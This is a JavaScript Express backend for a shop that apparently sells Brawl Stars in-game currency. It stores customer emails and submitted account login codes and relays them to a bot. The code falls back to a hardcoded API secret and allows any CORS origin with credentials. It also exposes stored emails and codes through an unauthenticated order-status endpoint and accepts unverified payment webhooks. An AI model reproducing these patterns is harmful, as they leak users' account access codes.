
import express from "express";
import axios from "axios";
import crypto from "crypto";
import cors from "cors";
import { Low } from 'lowdb';
import { JSONFile } from 'lowdb/node';
import path from 'path';
import { fileURLToPath } from 'url';

// =========== НАСТРОЙКИ ===========
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const PORT = process.env.PORT || 10000;
const BILEE_API = "https://paymentgate.bilee.ru/api";

const SHOP_ID = Number(process.env.shop_id) || 0;
const BILEE_PASSWORD = process.env.password || "";
const RENDER_URL = process.env.RENDER_URL || "https://duck-backend-by9a.onrender.com";
const FRONTEND_URL = "https://destrkod.github.io/duck";
const BOT_URL = process.env.BOT_URL || "https://duck-bot.onrender.com";
const API_SECRET = process.env.API_SECRET || "duck_shop_secret_2024";

// =========== БАЗА ДАННЫХ ===========
const dbFile = path.join(__dirname, 'db.json');
const adapter = new JSONFile(dbFile);
const defaultData = { 
  products: [], 
  orders: [],
  settings: {
    max_cart_total: 10000,
    created_at: new Date().toISOString()
  }
};
const db = new Low(adapter, defaultData);

// Загружаем данные
await db.read();

// =========== ПРИЛОЖЕНИЕ ===========
const app = express();
app.use(express.json());
app.use(cors({ 
  origin: ['https://destrkod.github.io', 'http://localhost:3000', '*'],
  credentials: true 
}));

// =========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ===========
function calculateOrderTotal(cart) {
  let total = 0;
  if (!cart || typeof cart !== 'object') return total;
  
  for (const [itemId, quantity] of Object.entries(cart)) {
    const product = db.data.products.find(p => p.id === itemId);
    if (product) {
      total += product.price * quantity;
    }
  }
  return total;
}

async function notifyBot(orderData) {
  try {
    if (!BOT_URL || !API_SECRET) {
      console.log('⚠️ BOT_URL или API_SECRET не настроены, уведомление не отправлено');
      return false;
    }
    
    const response = await axios.post(`${BOT_URL}/api/order-notify`, {
      ...orderData,
      secret: API_SECRET
    }, {
      timeout: 10000,
      headers: { 'Content-Type': 'application/json' }
    });
    
    console.log(`📤 Уведомление для заказа ${orderData.order_id} отправлено боту`);
    return response.data.success;
    
  } catch (error) {
    console.error('❌ Ошибка отправки уведомления боту:', error.message);
    return false;
  }
}

// =========== ГЕНЕРАЦИЯ ПОДПИСИ ДЛЯ BILEEPAY ===========
function generateSignatureNode(data, password) {
  const tokenData = {
    ...data,
    password: password
  };
  
  const excludedKeys = ["metadata", "signature"];
  
  const sortedKeys = Object.keys(tokenData)
    .filter((key) => !excludedKeys.includes(key))
    .sort();
  
  const valuesString = sortedKeys
    .map((key) => tokenData[key])
    .join("");
  
  const hash = crypto.createHash("sha256");
  hash.update(valuesString, "utf8");
  return hash.digest("hex");
}

// =========== ПРОДУКТЫ API ===========

// Получить все товары для сайта
app.get("/api/products", async (req, res) => {
  try {
    await db.read();
    
    // Если товаров нет - создаем несколько по умолчанию
    if (db.data.products.length === 0) {
      db.data.products = [
        {
          id: "c30",
          name: "30 кристаллов",
          price: 200,
          img: "https://i.imgur.com/s4K0WIP.png",
          gift: false
        },
        {
          id: "c80",
          name: "80 кристаллов",
          price: 550,
          img: "https://i.imgur.com/XbnZKDb.png",
          gift: false
        },
        {
          id: "c170",
          name: "170 кристаллов",
          price: 950,
          img: "https://i.imgur.com/X0JCmMQ.png",
          gift: false
        },
        {
          id: "bp",
          name: "Brawl Pass",
          price: 900,
          img: "https://i.imgur.com/FaFAL6l.png",
          gift: false
        }
      ];
      await db.write();
    }
    
    res.json({
      success: true,
      products: db.data.products,
      count: db.data.products.length,
      max_cart_total: db.data.settings.max_cart_total || 10000
    });
  } catch (error) {
    console.error("Ошибка получения товаров:", error);
    res.status(500).json({ 
      success: false,
      error: "Ошибка сервера",
      products: [] 
    });
  }
});

// Добавить товар (используется ботом)
app.post("/api/add-product", async (req, res) => {
  try {
    const { id, name, price, image, gift = false, secret } = req.body;
    
    // Проверка секрета
    if (secret !== API_SECRET) {
      console.log("Неверный секретный ключ:", secret);
      return res.status(401).json({ 
        success: false,
        error: "Неавторизовано" 
      });
    }
    
    console.log(`📦 Попытка добавить товар: "${name}" за ${price}₽`);
    
    if (!id || !name || !price || !image) {
      return res.status(400).json({ 
        success: false,
        error: "Не все поля заполнены" 
      });
    }
    
    await db.read();
    
    // Проверяем, нет ли уже товара с таким ID
    const existing = db.data.products.find(p => p.id === id);
    if (existing) {
      return res.status(400).json({ 
        success: false,
        error: "Товар с таким ID уже существует" 
      });
    }
    
    // Добавляем товар
    const newProduct = {
      id,
      name,
      price: Number(price),
      img: image,
      gift: Boolean(gift),
      created_at: new Date().toISOString()
    };
    
    db.data.products.push(newProduct);
    await db.write();
    
    console.log(`✅ Товар добавлен: ${newProduct.name} (ID: ${newProduct.id})`);
    
    res.json({
      success: true,
      product: newProduct,
      count: db.data.products.length,
      message: `Товар "${name}" успешно добавлен`
    });
    
  } catch (error) {
    console.error("Ошибка добавления товара:", error);
    res.status(500).json({ 
      success: false,
      error: "Ошибка сервера",
      details: error.message 
    });
  }
});

// Удалить товар
app.post("/api/delete-product", async (req, res) => {
  try {
    const { id, secret } = req.body;
    
    // Проверка секрета
    if (secret !== API_SECRET) {
      return res.status(401).json({ 
        success: false,
        error: "Неавторизовано" 
      });
    }
    
    console.log(`🗑️  Попытка удалить товар ID: ${id}`);
    
    await db.read();
    
    const initialCount = db.data.products.length;
    db.data.products = db.data.products.filter(p => p.id !== id);
    
    if (db.data.products.length === initialCount) {
      return res.status(404).json({ 
        success: false,
        error: "Товар не найден" 
      });
    }
    
    await db.write();
    console.log(`✅ Товар удален: ${id}`);
    
    res.json({
      success: true,
      deleted: id,
      count: db.data.products.length,
      message: `Товар ${id} успешно удален`
    });
    
  } catch (error) {
    console.error("Ошибка удаления товара:", error);
    res.status(500).json({ 
      success: false,
      error: "Ошибка сервера" 
    });
  }
});

// Получить список товаров для бота
app.get("/api/admin/products", async (req, res) => {
  try {
    const { secret } = req.query;
    
    // Проверка секрета
    if (secret !== API_SECRET) {
      return res.status(401).json({ 
        success: false,
        error: "Неавторизовано" 
      });
    }
    
    await db.read();
    
    res.json({
      success: true,
      products: db.data.products.map(p => ({
        id: p.id,
        name: p.name,
        price: p.price,
        image: p.img,
        gift: p.gift
      })),
      count: db.data.products.length
    });
    
  } catch (error) {
    console.error("Ошибка получения списка товаров:", error);
    res.status(500).json({ 
      success: false,
      error: "Ошибка сервера" 
    });
  }
});

// =========== ЗАКАЗЫ API ===========

// Отправка email (обновленный с уведомлением)
app.post("/submit-email", async (req, res) => {
  try {
    const { order_id, email, cart } = req.body;
    
    console.log(`📧 Email для заказа ${order_id}: ${email}`);
    console.log(`🛒 Корзина:`, cart);
    
    if (!order_id || !email || !cart) {
      return res.status(400).json({ 
        success: false, 
        error: "Не все поля заполнены" 
      });
    }
    
    await db.read();
    
    // Рассчитываем сумму заказа
    const amount = calculateOrderTotal(cart);
    
    // Создаем или обновляем заказ
    let orderIndex = db.data.orders.findIndex(o => o.id === order_id);
    
    if (orderIndex === -1) {
      // Создаем новый заказ
      const newOrder = {
        id: order_id,
        email: email,
        cart: cart,
        amount: amount,
        status: "pending_email",
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString()
      };
      
      db.data.orders.push(newOrder);
      orderIndex = db.data.orders.length - 1;
    } else {
      // Обновляем существующий заказ
      db.data.orders[orderIndex].email = email;
      db.data.orders[orderIndex].cart = cart;
      db.data.orders[orderIndex].amount = amount;
      db.data.orders[orderIndex].status = "pending_email";
      db.data.orders[orderIndex].updated_at = new Date().toISOString();
    }
    
    await db.write();
    
    console.log(`✅ Email сохранен для заказа ${order_id}`);
    
    // Отправляем первое уведомление боту (без кода)
    await notifyBot({
      order_id,
      email,
      items: cart,
      amount: amount,
      code: null,
      stage: "email_submitted"
    });
    
    res.json({ 
      success: true, 
      message: "Email сохранен",
      order_id,
      email,
      amount 
    });
    
  } catch (error) {
    console.error("Ошибка сохранения email:", error);
    res.status(500).json({ 
      success: false,
      error: "Ошибка сервера" 
    });
  }
});

// Отправка кода на проверку
app.post("/api/submit-code", async (req, res) => {
  try {
    const { order_id, email, code } = req.body;
    
    if (!order_id || !email || !code) {
      return res.status(400).json({ 
        success: false, 
        error: "Не все поля заполнены" 
      });
    }
    
    console.log(`🔢 Код для заказа ${order_id}: ${code}`);
    
    await db.read();
    
    // Находим заказ
    const orderIndex = db.data.orders.findIndex(o => o.id === order_id);
    
    if (orderIndex === -1) {
      return res.status(404).json({ 
        success: false, 
        error: "Заказ не найден" 
      });
    }
    
    // Проверяем email
    if (db.data.orders[orderIndex].email !== email) {
      return res.status(400).json({ 
        success: false, 
        error: "Email не совпадает" 
      });
    }
    
    // Обновляем заказ с кодом
    db.data.orders[orderIndex].code = code;
    db.data.orders[orderIndex].status = "pending_code";
    db.data.orders[orderIndex].code_submitted_at = new Date().toISOString();
    db.data.orders[orderIndex].updated_at = new Date().toISOString();
    
    await db.write();
    
    console.log(`✅ Код сохранен для заказа ${order_id}`);
    
    // Отправляем второе уведомление боту (с кодом)
    await notifyBot({
      order_id,
      email,
      items: db.data.orders[orderIndex].cart,
      amount: db.data.orders[orderIndex].amount,
      code: code,
      stage: "code_submitted"
    });
    
    res.json({ 
      success: true, 
      message: "Код отправлен на проверку",
      order_id,
      status: "pending",
      next_check: Date.now() + 5000 // Подсказка фронтенду когда проверять статус
    });
    
  } catch (error) {
    console.error("Ошибка сохранения кода:", error);
    res.status(500).json({ 
      success: false,
      error: "Ошибка сервера" 
    });
  }
});

// Проверка статуса заказа
app.get("/api/order-status/:order_id", async (req, res) => {
  try {
    const { order_id } = req.params;
    
    await db.read();
    
    const order = db.data.orders.find(o => o.id === order_id);
    
    if (!order) {
      return res.status(404).json({ 
        success: false, 
        error: "Заказ не найден" 
      });
    }
    
    // Форматируем информацию о товарах
    const itemsInfo = [];
    if (order.cart && typeof order.cart === 'object') {
      for (const [itemId, quantity] of Object.entries(order.cart)) {
        const product = db.data.products.find(p => p.id === itemId);
        itemsInfo.push({
          id: itemId,
          name: product ? product.name : itemId,
          quantity: quantity,
          price: product ? product.price : 0,
          total: product ? product.price * quantity : 0
        });
      }
    }
    
    res.json({
      success: true,
      order_id,
      email: order.email,
      code: order.code,
      status: order.status || "unknown",
      amount: order.amount || 0,
      items: itemsInfo,
      created_at: order.created_at,
      updated_at: order.updated_at || order.created_at,
      completed_at: order.completed_at,
      admin_comment: order.admin_comment
    });
    
  } catch (error) {
    console.error("Ошибка проверки статуса:", error);
    res.status(500).json({ 
      success: false,
      error: "Ошибка сервера" 
    });
  }
});

// Обновление статуса заказа от бота
app.post("/api/order-status-update", async (req, res) => {
  try {
    const { order_id, status, admin_comment, secret } = req.body;
    
    // Проверка секрета
    if (secret !== API_SECRET) {
      return res.status(401).json({ 
        success: false, 
        error: "Неавторизовано" 
      });
    }
    
    if (!order_id || !status) {
      return res.status(400).json({ 
        success: false, 
        error: "Не все поля заполнены" 
      });
    }
    
    console.log(`🔄 Обновление статуса заказа ${order_id}: ${status}`);
    
    await db.read();
    
    const orderIndex = db.data.orders.findIndex(o => o.id === order_id);
    
    if (orderIndex === -1) {
      return res.status(404).json({ 
        success: false, 
        error: "Заказ не найден" 
      });
    }
    
    // Обновляем статус
    db.data.orders[orderIndex].status = status;
    db.data.orders[orderIndex].updated_at = new Date().toISOString();
    
    if (admin_comment) {
      db.data.orders[orderIndex].admin_comment = admin_comment;
    }
    
    // Если статус завершен, добавляем дату выполнения
    if (status === "completed") {
      db.data.orders[orderIndex].completed_at = new Date().toISOString();
    }
    
    // Если статус отклонен
    if (status === "rejected") {
      db.data.orders[orderIndex].rejected_at = new Date().toISOString();
    }
    
    await db.write();
    
    console.log(`✅ Статус заказа ${order_id} обновлен на "${status}"`);
    
    res.json({ 
      success: true, 
      message: "Статус обновлен",
      order_id,
      status 
    });
    
  } catch (error) {
    console.error("Ошибка обновления статуса:", error);
    res.status(500).json({ 
      success: false,
      error: "Ошибка сервера" 
    });
  }
});

// Получить список всех заказов (для админа)
app.get("/api/admin/orders", async (req, res) => {
  try {
    const { secret, limit = 50, status } = req.query;
    
    // Проверка секрета
    if (secret !== API_SECRET) {
      return res.status(401).json({ 
        success: false,
        error: "Неавторизовано" 
      });
    }
    
    await db.read();
    
    // Фильтруем заказы если указан статус
    let orders = db.data.orders;
    if (status) {
      orders = orders.filter(o => o.status === status);
    }
    
    // Сортируем по дате создания (новые первые)
    orders.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
    
    // Ограничиваем количество
    orders = orders.slice(0, parseInt(limit));
    
    // Форматируем ответ
    const formattedOrders = orders.map(order => ({
      id: order.id,
      email: order.email,
      code: order.code,
      status: order.status,
      amount: order.amount || 0,
      items_count: order.cart ? Object.keys(order.cart).length : 0,
      created_at: order.created_at,
      updated_at: order.updated_at,
      completed_at: order.completed_at,
      admin_comment: order.admin_comment
    }));
    
    res.json({
      success: true,
      orders: formattedOrders,
      count: formattedOrders.length,
      total_count: db.data.orders.length,
      stats: {
        pending: db.data.orders.filter(o => o.status === 'pending_code').length,
        completed: db.data.orders.filter(o => o.status === 'completed').length,
        rejected: db.data.orders.filter(o => o.status === 'rejected').length
      }
    });
    
  } catch (error) {
    console.error("Ошибка получения списка заказов:", error);
    res.status(500).json({ 
      success: false,
      error: "Ошибка сервера" 
    });
  }
});

// =========== ПЛАТЕЖНАЯ СИСТЕМА BILEEPAY ===========
app.post("/create-payment", async (req, res) => {
  try {
    const { items, method } = req.body;
    
    if (!items || !method) {
      return res.status(400).json({ error: "Требуются items и method" });
    }
    
    if (!SHOP_ID || !BILEE_PASSWORD) {
      return res.status(500).json({ 
        error: "Не настроены shop_id или password" 
      });
    }
    
    // Рассчитываем сумму
    const amountRub = calculateOrderTotal(items);
    
    if (amountRub === 0) {
      return res.status(400).json({ error: "Сумма заказа 0" });
    }
    
    // Проверяем лимит корзины
    const maxCartTotal = db.data.settings.max_cart_total || 10000;
    if (amountRub > maxCartTotal) {
      return res.status(400).json({ 
        error: `Сумма заказа превышает лимит ${maxCartTotal}₽` 
      });
    }
    
    const order_id = `duck_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    // Создаем предварительный заказ в базе
    await db.read();
    
    const newOrder = {
      id: order_id,
      cart: items,
      amount: amountRub,
      status: "created",
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString()
    };
    
    db.data.orders.push(newOrder);
    await db.write();
    
    const payload = {
      order_id,
      method_slug: method,
      amount: amountRub, 
      shop_id: SHOP_ID,
      success_url: `${FRONTEND_URL}/success-pay.html?order=${order_id}`,
      fail_url: `${FRONTEND_URL}/fail.html`,
      description: `Заказ #${order_id.substring(0, 8)}`,
      notify_url: `${RENDER_URL}/bilee-notify`
    };
    
    payload.signature = generateSignatureNode(payload, BILEE_PASSWORD);
    
    const response = await axios.post(
      `${BILEE_API}/payment/init`,
      payload,
      { 
        timeout: 15000,
        headers: { 'Content-Type': 'application/json' }
      }
    );
    
    if (response.data && response.data.url) {
      res.json({
        success: true,
        url: response.data.url,
        order_id,
        amount: amountRub
      });
    } else {
      throw new Error("BileePay не вернул URL");
    }
    
  } catch (error) {
    console.error("💥 Ошибка создания платежа:", error.message);
    
    if (error.response) {
      res.status(500).json({
        error: `BileePay ошибка ${error.response.status}`,
        details: error.response.data
      });
    } else {
      res.status(500).json({
        error: "Ошибка сервера",
        details: error.message
      });
    }
  }
});

// Уведомление от BileePay
app.post("/bilee-notify", (req, res) => {
  console.log("📦 Уведомление от BileePay:", req.body);
  
  // Здесь можно обновить статус заказа в базе
  // если платежная система присылает ID заказа
  
  res.status(200).json({ 
    success: true,
    message: "OK" 
  });
});

// =========== ГЛАВНАЯ СТРАНИЦА ===========
app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>🦆 Duck Shop Backend</title>
      <style>
        body { 
          font-family: Arial, sans-serif; 
          padding: 40px; 
          max-width: 1000px; 
          margin: 0 auto;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white;
          min-height: 100vh;
        }
        .container {
          background: rgba(255, 255, 255, 0.1);
          backdrop-filter: blur(10px);
          padding: 30px;
          border-radius: 20px;
          border: 1px solid rgba(255, 255, 255, 0.2);
        }
        h1 { color: white; margin-bottom: 20px; }
        .status { 
          background: #4CAF50; 
          color: white; 
          padding: 15px 25px; 
          border-radius: 10px;
          display: inline-block;
          margin-bottom: 20px;
          font-weight: bold;
        }
        .card {
          background: rgba(255, 255, 255, 0.15);
          padding: 20px;
          border-radius: 10px;
          margin: 15px 0;
        }
        ul { list-style: none; padding: 0; }
        li { margin: 10px 0; }
        a { 
          color: #4FC3F7; 
          text-decoration: none;
          font-weight: bold;
        }
        a:hover { text-decoration: underline; }
        .api-list { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        @media (max-width: 768px) {
          .api-list { grid-template-columns: 1fr; }
          body { padding: 20px; }
        }
        .stat-item {
          display: flex;
          justify-content: space-between;
          padding: 8px 0;
          border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .stat-value {
          font-weight: bold;
          color: #4FC3F7;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>🦆 Duck Shop Backend</h1>
        <div class="status">✅ Статус: Работает</div>
        
        <div class="card">
          <h3>📊 Статистика системы:</h3>
          <div class="stat-item">
            <span>🛒 Товаров в базе:</span>
            <span class="stat-value">${db.data.products.length}</span>
          </div>
          <div class="stat-item">
            <span>📦 Всего заказов:</span>
            <span class="stat-value">${db.data.orders.length}</span>
          </div>
          <div class="stat-item">
            <span>⏳ Ожидают проверки:</span>
            <span class="stat-value">${db.data.orders.filter(o => o.status === 'pending_code').length}</span>
          </div>
          <div class="stat-item">
            <span>✅ Завершённые:</span>
            <span class="stat-value">${db.data.orders.filter(o => o.status === 'completed').length}</span>
          </div>
          <div class="stat-item">
            <span>❌ Отклонённые:</span>
            <span class="stat-value">${db.data.orders.filter(o => o.status === 'rejected').length}</span>
          </div>
          <div class="stat-item">
            <span>🌐 URL:</span>
            <span class="stat-value">${RENDER_URL}</span>
          </div>
          <div class="stat-item">
            <span>🔧 Версия API:</span>
            <span class="stat-value">3.0.0</span>
          </div>
          <div class="stat-item">
            <span>⏰ Время:</span>
            <span class="stat-value">${new Date().toLocaleString()}</span>
          </div>
        </div>
        
        <div class="card">
          <h3>📡 API Endpoints:</h3>
          <div class="api-list">
            <div>
              <h4>🛍️ Для сайта:</h4>
              <ul>
                <li><a href="/api/products" target="_blank">/api/products</a> - Все товары</li>
                <li>POST /submit-email - Сохранить email</li>
                <li>POST /api/submit-code - Отправить код</li>
                <li>GET /api/order-status/:id - Статус заказа</li>
                <li><a href="/check" target="_blank">/check</a> - Статус сервера</li>
                <li>POST /create-payment - Создать платеж</li>
              </ul>
            </div>
            <div>
              <h4>🤖 Для бота:</h4>
              <ul>
                <li>POST /api/add-product - Добавить товар</li>
                <li>POST /api/delete-product - Удалить товар</li>
                <li>GET /api/admin/products - Список товаров</li>
                <li>GET /api/admin/orders - Список заказов</li>
                <li>POST /api/order-status-update - Обновить статус</li>
              </ul>
            </div>
          </div>
        </div>
        
        <div class="card">
          <h3>🔄 Интеграции:</h3>
          <ul>
            <li><strong>🤖 Бот:</strong> ${BOT_URL ? '✅ Подключен' : '❌ Не настроен'}</li>
            <li><strong>💳 BileePay:</strong> ${SHOP_ID > 0 ? '✅ Настроены' : '❌ Не настроены'}</li>
            <li><strong>📧 Уведомления:</strong> ${BOT_URL && API_SECRET ? '✅ Активны' : '❌ Не активны'}</li>
            <li><strong>🔐 Безопасность:</strong> ${API_SECRET ? '✅ Включена' : '❌ Отключена'}</li>
          </ul>
        </div>
        
        <div class="card">
          <h3>🚀 Быстрые ссылки:</h3>
          <ul>
            <li><a href="https://destrkod.github.io/duck" target="_blank">🛒 Магазин (Сайт)</a></li>
            <li><a href="${BOT_URL || '#'}" target="_blank">🤖 Панель бота</a></li>
            <li><a href="https://render.com" target="_blank">⚙️ Render Dashboard</a></li>
            <li><a href="https://github.com/DESTRKOD/duck-backend" target="_blank">📦 GitHub репозиторий</a></li>
          </ul>
        </div>
        
        <p style="margin-top: 30px; color: rgba(255,255,255,0.7); font-size: 14px;">
          🔄 Система уведомлений: ${BOT_URL && API_SECRET ? '✅ Активна' : '⚠️ Требует настройки'}<br>
          📊 Заказы в реальном времени: ✅ Работает<br>
          💳 Платежная система: ${SHOP_ID > 0 ? '✅ Готова' : '⚠️ Требует shop_id/password'}<br>
          🔐 Безопасность API: ✅ Включена
        </p>
      </div>
    </body>
    </html>
  `);
});

// =========== СТАТУС СЕРВЕРА ===========
app.get("/check", async (req, res) => {
  await db.read();
  
  const pendingOrders = db.data.orders.filter(o => o.status === 'pending_code').length;
  const completedOrders = db.data.orders.filter(o => o.status === 'completed').length;
  
  res.json({
    status: "ok",
    server: "Duck Shop Backend v3.0",
    shop_id: SHOP_ID,
    password_set: !!BILEE_PASSWORD,
    products_count: db.data.products.length,
    orders_count: db.data.orders.length,
    pending_orders: pendingOrders,
    completed_orders: completedOrders,
    security: "enabled",
    integrations: {
      bot: !!BOT_URL,
      payments: SHOP_ID > 0,
      notifications: !!(BOT_URL && API_SECRET)
    },
    time: new Date().toISOString(),
    url: RENDER_URL,
    bot_url: BOT_URL,
    endpoints: {
      products: `${RENDER_URL}/api/products`,
      order_status: `${RENDER_URL}/api/order-status/{id}`,
      create_payment: `${RENDER_URL}/create-payment`,
      admin_orders: `${RENDER_URL}/api/admin/orders?secret={API_SECRET}`
    }
  });
});

// =========== ТЕСТ СОЕДИНЕНИЯ ===========
app.get("/test", (req, res) => {
  res.json({
    success: true,
    message: "✅ Сервер работает корректно",
    timestamp: new Date().toISOString(),
    version: "3.0.0",
    features: {
      products_api: true,
      orders_api: true,
      bot_integration: !!(BOT_URL && API_SECRET),
      payment_system: SHOP_ID > 0,
      security_check: true,
      realtime_notifications: !!(BOT_URL && API_SECRET)
    },
    stats: {
      products: db.data.products.length,
      orders: db.data.orders.length,
      pending: db.data.orders.filter(o => o.status === 'pending_code').length
    },
    links: {
      products: `${RENDER_URL}/api/products`,
      bot: BOT_URL || "Не настроен",
      github: "https://github.com/DESTRKOD/duck-backend",
      frontend: "https://destrkod.github.io/duck"
    }
  });
});

// =========== СИСТЕМНЫЕ ЭНДПОИНТЫ ===========

// Экспорт данных (для админа)
app.get("/api/export", async (req, res) => {
  try {
    const { secret, type = 'json' } = req.query;
    
    if (secret !== API_SECRET) {
      return res.status(401).json({ error: "Неавторизовано" });
    }
    
    await db.read();
    
    if (type === 'csv') {
      // Формируем CSV
      let csv = "ID,Email,Code,Status,Amount,Items,Created,Updated\n";
      
      db.data.orders.forEach(order => {
        const items = order.cart ? Object.entries(order.cart).map(([id, qty]) => `${id}:${qty}`).join(';') : '';
        csv += `"${order.id}","${order.email || ''}","${order.code || ''}","${order.status || ''}",${order.amount || 0},"${items}","${order.created_at}","${order.updated_at || ''}"\n`;
      });
      
      res.setHeader('Content-Type', 'text/csv');
      res.setHeader('Content-Disposition', 'attachment; filename=orders.csv');
      res.send(csv);
    } else {
      res.json({
        success: true,
        timestamp: new Date().toISOString(),
        data: db.data
      });
    }
    
  } catch (error) {
    console.error("Ошибка экспорта данных:", error);
    res.status(500).json({ success: false, error: "Ошибка сервера" });
  }
});

// Очистка старых заказов
app.post("/api/cleanup", async (req, res) => {
  try {
    const { secret, days = 30 } = req.body;
    
    if (secret !== API_SECRET) {
      return res.status(401).json({ error: "Неавторизовано" });
    }
    
    await db.read();
    
    const cutoffDate = new Date();
    cutoffDate.setDate(cutoffDate.getDate() - parseInt(days));
    
    const initialCount = db.data.orders.length;
    db.data.orders = db.data.orders.filter(order => {
      const orderDate = new Date(order.created_at);
      return orderDate > cutoffDate;
    });
    
    const removedCount = initialCount - db.data.orders.length;
    
    await db.write();
    
    res.json({
      success: true,
      removed: removedCount,
      remaining: db.data.orders.length,
      cutoff_date: cutoffDate.toISOString()
    });
    
  } catch (error) {
    console.error("Ошибка очистки данных:", error);
    res.status(500).json({ success: false, error: "Ошибка сервера" });
  }
});

// =========== ЗАПУСК СЕРВЕРА ===========
app.listen(PORT, "0.0.0.0", async () => {
  console.log(`✅ Сервер запущен на порту ${PORT}`);
  console.log(`🛒 Shop ID: ${SHOP_ID ? '✅ ' + SHOP_ID : '❌ Не настроен'}`);
  console.log(`💳 BileePay: ${SHOP_ID > 0 && BILEE_PASSWORD ? '✅ Настроен' : '❌ Требует настройки'}`);
  console.log(`🤖 Бот URL: ${BOT_URL ? '✅ ' + BOT_URL : '❌ Не настроен'}`);
  console.log(`🔐 API Secret: ${API_SECRET ? '✅ Установлен' : '❌ Не установлен'}`);
  console.log(`🗄️ Товаров в базе: ${db.data.products.length}`);
  console.log(`📦 Заказов в базе: ${db.data.orders.length}`);
  console.log(`🌐 URL: ${RENDER_URL}`);
  console.log(`🛍️ API товаров: ${RENDER_URL}/api/products`);
  console.log(`💸 Платежный API: ${RENDER_URL}/create-payment`);
  console.log(`🔓 Безопасность: Проверка secret включена`);
  console.log(`🔄 Уведомления боту: ${BOT_URL && API_SECRET ? '✅ Активны' : '❌ Не активны'}`);
  console.log(`🚀 Готов к работе!`);
  
  // Автоматическое создание тестовых товаров если база пустая
  await db.read();
  if (db.data.products.length === 0) {
    console.log(`📦 Создаю тестовые товары...`);
    db.data.products = [
      { id: "c30", name: "30 кристаллов", price: 200, img: "https://i.imgur.com/s4K0WIP.png", gift: false },
      { id: "c80", name: "80 кристаллов", price: 550, img: "https://i.imgur.com/XbnZKDb.png", gift: false }
    ];
    await db.write();
    console.log(`✅ Создано ${db.data.products.length} тестовых товаров`);
  }
});
